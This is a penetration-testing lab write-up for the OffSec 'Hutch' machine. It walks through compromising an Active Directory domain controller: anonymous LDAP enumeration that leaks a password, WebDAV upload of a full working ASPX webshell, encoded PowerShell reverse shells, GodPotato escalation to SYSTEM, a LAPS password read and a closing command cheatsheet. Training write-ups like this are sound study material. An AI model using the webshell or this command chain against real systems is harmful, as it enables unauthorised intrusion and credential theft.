![Hutch attack path](/images/lab-writeups/hutch.svg)

# Hutch Write-Up

Source: OffSec

Difficulty: Intermediate

Categories: Active Directory, IIS, WebDAV, LDAP anonymous bind, LAPS, ASPX webshell, GodPotato

## Nmap Signals

The scan showed a Windows Domain Controller:

```text
53/tcp    open  domain
80/tcp    open  http Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap Active Directory LDAP (Domain: hutch.offsec)
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http
5985/tcp  open  WinRM
9389/tcp  open  .NET Message Framing
```

Port 80 exposed WebDAV methods:

```text
OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
```

Risky methods included:

```text
PUT, COPY, DELETE, MOVE, PROPFIND, PROPPATCH, MKCOL, LOCK, UNLOCK
```

SMB signing was enabled and required, so relay into SMB on the DC was not a good path.

## LDAP Anonymous Bind

Anonymous LDAP enumeration exposed users and descriptions:

```bash
nxc ldap $TARGET -u '' -p '' --users
```

The important result:

```text
fmcsorley  Password set to CrabSharkJellyfish192 at user's request. Please change on next login.
```

Credentials recovered:

```text
fmcsorley:CrabSharkJellyfish192
```

## Attack Vector 1: WebDAV and GodPotato

The steps:

```text
1. Add hutch.offsec and hutchdc.hutch.offsec to /etc/hosts.
2. Test SMB null session.
3. Enumerate LDAP anonymously.
4. Recover fmcsorley credentials from the description field.
5. Test WinRM.
6. Test WebDAV PUT with credentials.
7. Confirm the uploaded test file is retrievable by GET.
8. Upload ASPX webshell.
9. Execute whoami through the webshell.
10. Trigger a PowerShell reverse shell.
11. Confirm SeImpersonatePrivilege.
12. Run GodPotato-NET4.
13. Return a SYSTEM reverse shell.
```

Testing WebDAV:

```bash
curl -v -X PUT http://192.168.137.122/test.txt \
  -u "fmcsorley:CrabSharkJellyfish192" \
  -d "hello"
```

If GET returns the same content:

```bash
curl http://192.168.137.122/test.txt
```

then WebDAV root and IIS web root overlap.

## ASPX Webshell

Since the server was IIS with ASP.NET, the correct shell type was ASPX:

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%
string cmd = Request.QueryString["cmd"];
if(cmd != null) {
    ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + cmd);
    psi.RedirectStandardOutput = true;
    psi.UseShellExecute = false;
    psi.CreateNoWindow = true;
    Process p = Process.Start(psi);
    string output = p.StandardOutput.ReadToEnd();
    Response.Write("<pre>" + output + "</pre>");
}
%>
```

Upload:

```bash
curl -v -X PUT http://192.168.137.122/simple_webshell.aspx \
  -u "fmcsorley:CrabSharkJellyfish192" \
  --data-binary @simple_webshell.aspx
```

Confirm RCE:

```bash
curl "http://192.168.137.122/simple_webshell.aspx?cmd=whoami"
```

Expected user:

```text
iis apppool\defaultapppool
```

## PowerShell EncodedCommand Delivery

PowerShell `-EncodedCommand` expects UTF-16LE encoded text converted to base64.

When sending base64 through a URL, `+` and `=` must be URL-encoded. The safest method is:

```bash
curl -G "http://192.168.137.122/simple_webshell.aspx" \
  --data-urlencode "cmd=powershell -e <base64>"
```

`-G` keeps it as a GET query string, which matters because the webshell reads `Request.QueryString["cmd"]`.

## SeImpersonatePrivilege

IIS app pool identities commonly have SeImpersonatePrivilege:

```cmd
whoami /all
```

If enabled, the Potato family of attacks becomes relevant. .NET 4.x was present, so `GodPotato-NET4.exe` was appropriate:

```powershell
.\GodPotato.exe -cmd "cmd /c whoami"
```

SYSTEM reverse shell:

```powershell
.\GodPotato.exe -cmd "cmd /c powershell -e <base64_for_4444>"
```

## Attack Vector 2: LAPS Password Read

BloodHound showed that `fmcsorley` had a `ReadLAPSPassword` edge over `HUTCHDC.HUTCH.OFFSEC`.

Collect:

```bash
bloodhound-python -u fmcsorley -p CrabSharkJellyfish192 \
  -d hutch.offsec -ns 192.168.137.122 -c all
```

Read LAPS password:

```bash
ldapsearch -v -c -D fmcsorley@hutch.offsec \
  -w CrabSharkJellyfish192 \
  -b "DC=hutch,DC=offsec" \
  -H ldap://$IP \
  "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```

Example result:

```text
ms-Mcs-AdmPwd: 54@YBz89U;43hU
```

Use PsExec with the local Administrator account:

```bash
psexec.py "HUTCH/Administrator@$IP"
```

## Signals and Methodology

Port combination `53 + 88 + 389 + 445 + 464` means Domain Controller.

WebDAV methods on IIS are high priority because `PUT` may allow direct webroot writes.

IIS plus ASP.NET decides the shell format: use ASPX.

SMB signing required means SMB relay into that host should be crossed off.

LDAP anonymous bind can leak usernames, descriptions, group memberships, and sometimes credentials.

WinRM being open but failing for one user means that user lacks rights, not that WinRM is useless.

`PUT 201` plus successful GET confirms WebDAV writes land in the web root.

An IIS app pool shell with SeImpersonatePrivilege points directly toward Potato-style escalation.

BloodHound Outbound Object Control should be checked after every AD credential.

## Laudanum Shell Note

Laudanum shells include IP whitelisting. If the shell returns a fake 404 despite being uploaded, inspect the source or spoof X-Forwarded-For:

```bash
curl http://192.168.137.122/shell.aspx \
  -H "X-Forwarded-For: 127.0.0.1" \
  --data "c=whoami"
```

It is often more reliable to use a minimal ASPX webshell.

## Cheatsheet

```bash
ldapsearch -x -H ldap://<target> \
  -b "DC=hutch,DC=offsec" \
  -s sub "(objectclass=user)" \
  sAMAccountName description

curl -v -X PUT http://<target>/test.txt -u "user:pass" -d "hello"
curl -v -X PUT http://<target>/shell.aspx -u "user:pass" --data-binary @shell.aspx
curl -G "http://<target>/shell.aspx" --data-urlencode "cmd=whoami"
```

## Lessons Learned

Run BloodHound as soon as valid AD credentials are found.

Use `davtest` on WebDAV targets before manually testing extensions.

Use `curl -G --data-urlencode` for encoded payload delivery.

Confirm RCE with `whoami` before launching a reverse shell.

Read LDAP description fields. They frequently contain operational notes and sometimes passwords.
